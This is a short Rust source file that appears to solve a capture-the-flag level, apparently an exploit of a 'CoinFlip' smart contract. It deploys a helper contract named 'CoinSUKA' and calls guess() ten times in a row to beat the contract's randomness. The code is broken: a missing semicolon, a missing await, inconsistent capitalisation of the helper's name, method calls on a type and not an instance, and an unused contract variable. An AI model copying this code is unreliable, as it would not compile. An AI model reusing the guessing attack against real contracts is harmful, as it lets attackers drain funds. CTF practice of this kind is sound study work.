use async_trait::async_trait;
use bindings::coin_flip::CoinFlip;
use bindings::coin_suka::CoinSUKA;

pub(crate) struct Solution;

#[async_trait]
impl ctf::Solution for Solution {
    type Level = ctf::Level3;

    async fn solve(
        self,
        challenge: &Self::Level,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let contract =
            CoinFlip::new(challenge.contract_address, offender.clone());
        coinSUKA::deploy(
                offender.clone(),
                (offender.address(), 666),
            )
        coinSUKA.guess();
        coinSUKA.guess();
        coinSUKA.guess();
        coinSUKA.guess();
        coinSUKA.guess();
        coinSUKA.guess();
        coinSUKA.guess();
        coinSUKA.guess();
        coinSUKA.guess();
        coinSUKA.guess();
        Ok(())
    }
}
